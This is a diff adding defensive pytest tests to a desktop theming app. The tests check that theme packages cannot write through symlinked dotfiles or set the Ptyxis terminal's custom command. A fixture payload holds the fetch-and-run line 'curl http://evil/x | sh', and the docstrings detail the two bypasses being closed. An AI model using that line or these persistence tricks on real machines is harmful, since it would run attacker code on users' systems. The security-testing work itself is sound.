@@ -113,6 +113,126 @@ def test_a_look_that_writes_a_program_is_refused_whole(engine, tmp_path, dest):
     assert not (engine.dest_root / ".config" / "demo" / "innocent.css").exists()
 
 
+def _dotfiles_home(root: Path) -> None:
+    """Rearrange ``root`` the way a stow/chezmoi user's home folder really is.
+
+    ``~/.bashrc`` is a link to a file in the repository, ``~/.config`` is a link
+    to a whole directory in it, and ``~/.local/bin`` is a third. This is the
+    ordinary state of the machines this app is aimed at, not an exotic one.
+    """
+    dotfiles = root / "dotfiles"
+    (dotfiles / "config" / "fish" / "conf.d").mkdir(parents=True)
+    (dotfiles / "config" / "autostart").mkdir(parents=True)
+    (dotfiles / "bin").mkdir(parents=True)
+    (dotfiles / "bashrc").write_text("# the user's own\n", encoding="utf-8")
+    (root / ".bashrc").symlink_to(dotfiles / "bashrc")
+    (root / ".config").symlink_to(dotfiles / "config")
+    (root / ".local").mkdir()
+    (root / ".local" / "bin").symlink_to(dotfiles / "bin")
+
+
+@pytest.mark.parametrize(
+    "dest",
+    [
+        "~/.bashrc",
+        "~/.config/fish/conf.d/evil.fish",
+        "~/.config/autostart/wallpaper.png",
+        "~/.local/bin/helper",
+    ],
+)
+def test_the_refusal_holds_when_the_destination_is_a_shortcut(engine, tmp_path, dest):
+    """C1's bypass. The policy judged the wrong path.
+
+    ``confine_dest`` returns — and ``_write_files`` writes through — the
+    *unresolved* destination, while the tier lookup classified the destination
+    with every symlink followed. So on any machine where ``~/.bashrc`` or the
+    whole of ``~/.config`` is a link into a dotfiles repository, ``.bashrc``
+    resolved to ``dotfiles/bashrc``, matched no entry in any list, and a Look
+    declaring ``dest = "~/.bashrc"`` compiled clean, previewed as "1 file" and
+    applied. Every folder and file rule was defeated at once, and only the
+    ``.desktop``/``.service`` suffix rule survived, because it matches the raw
+    name. Both forms of the path are judged now, and the worse answer wins.
+    """
+    _dotfiles_home(engine.dest_root)
+    directory = _look(
+        tmp_path / "demo",
+        f"""
+        [[files]]
+        src = "payload"
+        dest = "{dest}"
+        """,
+        {"payload": "curl http://evil/x | sh\n"},
+    )
+    compiled = _compiled(directory, engine.dest_root)
+
+    assert compiled.refused, f"{dest} through a shortcut is still {dest}"
+    with pytest.raises(TransactionError):
+        compiled.transaction.apply(restore_point=False)
+    assert (engine.dest_root / ".bashrc").read_text(encoding="utf-8") == "# the user's own\n"
+
+
+def test_a_shortcut_cannot_smuggle_a_destination_into_a_refused_folder(engine, tmp_path):
+    """The mirror of the case above: a link whose *name* is innocent.
+
+    Judging only the written path would be the same bug pointing the other way
+    — ``~/shortcut/helper`` is not in any list until you follow it and find
+    ``~/.local/bin/helper``. Both answers are taken, so neither spelling works.
+    """
+    root = engine.dest_root
+    (root / ".local" / "bin").mkdir(parents=True)
+    (root / "shortcut").symlink_to(root / ".local" / "bin")
+
+    directory = _look(
+        tmp_path / "demo",
+        """
+        [[files]]
+        src = "payload"
+        dest = "~/shortcut/helper"
+        """,
+        {"payload": "#!/bin/sh\nid\n"},
+    )
+    compiled = _compiled(directory, engine.dest_root)
+
+    assert compiled.refused, compiled.warnings
+    with pytest.raises(TransactionError):
+        compiled.transaction.apply(restore_point=False)
+    assert not (root / ".local" / "bin" / "helper").exists()
+
+
+def test_a_consequential_file_stays_named_when_its_folder_is_a_shortcut(engine, tmp_path):
+    """C1's quieter half, defeated by the same bypass.
+
+    With ``~/.config`` a link, ``starship.toml`` resolved to
+    ``dotfiles/config/starship.toml``, dropped out of the CONSEQUENTIAL tier and
+    fell back into the anonymous "N files" count — the exact collapse the tier
+    exists to stop, under the sentence "Looks only change settings."
+    """
+    _dotfiles_home(engine.dest_root)
+    directory = _look(
+        tmp_path / "demo",
+        """
+        [[files]]
+        src = "starship.toml"
+        dest = "~/.config/starship.toml"
+
+        [[files]]
+        src = "wall.png"
+        dest = "~/.local/share/backgrounds/demo/wall.png"
+
+        [[files]]
+        src = "gtk.css"
+        dest = "~/.config/gtk-4.0/gtk.css"
+        """,
+        {"starship.toml": "format = '$all'\n", "wall.png": "not a png", "gtk.css": "* {}"},
+    )
+    compiled = _compiled(directory, engine.dest_root)
+    assert not compiled.refused, compiled.refusals
+
+    lines = compiled.transaction.plan().to_novice_lines()
+    assert any("starship.toml" in line for line in lines), lines
+    assert not any(line == "3 files" for line in lines), lines
+
+
 def test_a_saved_moment_can_still_put_back_a_file_a_look_may_not_write(engine, tmp_path):
     """The refusal is about Looks, not about the machine's own history.
 
@@ -276,6 +396,75 @@ def test_a_look_that_changes_what_the_desktop_runs_is_refused(engine, tmp_path, 
     with pytest.raises(TransactionError):
         compiled.transaction.apply(restore_point=False)
     assert not (engine.dest_root / ".config" / "demo" / "innocent.css").exists()
+
+
+@pytest.mark.parametrize(
+    "key",
+    [
+        "dconf:/org/gnome/Ptyxis/Profiles/abc123/custom-command",
+        "dconf:/org/gnome/Ptyxis/Profiles/abc123/use-custom-command",
+        "dconf:/org/gnome/Ptyxis/Profiles/abc123/login-shell",
+        (
+            "gsettings-path:org.gnome.Ptyxis.Profile"
+            ":/org/gnome/Ptyxis/Profiles/abc123/ custom-command"
+        ),
+        "gsettings:org.gnome.Ptyxis.Profile login-shell",
+    ],
+)
+def test_a_look_cannot_set_the_command_the_terminal_runs(engine, tmp_path, key):
+    """H4's hole: the allow-list opened a tree, not a set of keys.
+
+    ``/org/gnome/Ptyxis/`` was allowed whole, commented "the terminal's own
+    colours" — but ``org.gnome.Ptyxis.Profile`` is relocatable, its instances
+    live at ``/org/gnome/Ptyxis/Profiles/<uuid>/``, and among the colours it
+    carries ``custom-command``, ``use-custom-command`` and ``login-shell``. A
+    Look setting those compiled clean and applied, and the whole preview the
+    user saw was "Terminal" — printed above "Looks only change settings. They
+    can't run programs on your computer." Every window opened afterwards ran
+    the Look's command. It needed no prior knowledge of the machine:
+    ``docs/preset-format.md`` documents that very path shape as the intended
+    way to address a profile.
+    """
+    directory = _look(
+        tmp_path / "demo",
+        f"""
+        [[files]]
+        src = "innocent.css"
+        dest = "~/.config/demo/innocent.css"
+
+        [[settings]]
+        key = "{key}"
+        value = "'anything'"
+        component = "terminal"
+        """,
+        {"innocent.css": "/* harmless */"},
+    )
+    compiled = _compiled(directory, engine.dest_root)
+
+    assert compiled.refused, compiled.warnings
+    with pytest.raises(TransactionError):
+        compiled.transaction.apply(restore_point=False)
+    assert not (engine.dest_root / ".config" / "demo" / "innocent.css").exists()
+
+
+@pytest.mark.parametrize(
+    "key",
+    [
+        "dconf:/org/gnome/Ptyxis/Profiles/abc123/palette",
+        "dconf:/org/gnome/Ptyxis/Profiles/abc123/opacity",
+        "gsettings:org.gnome.Ptyxis font-name",
+        "gsettings-path:org.gnome.Ptyxis.Profile:/org/gnome/Ptyxis/Profiles/abc123/ palette",
+    ],
+)
+def test_the_terminal_colours_the_shipped_looks_write_are_still_allowed(key):
+    """The refusal is three key names, not the terminal.
+
+    All four bundled Looks write a Ptyxis profile's palette and opacity through
+    exactly this address, so a fix that closed the tree would have refused the
+    shipped product — which is what ``test_every_shipped_look_stays_applicable``
+    would have caught, and what this says in one line.
+    """
+    assert setting_verdict(key).tier is Tier.ALLOWED
 
 
 def test_the_add_on_locations_the_shipped_looks_use_are_still_allowed(engine, tmp_path):
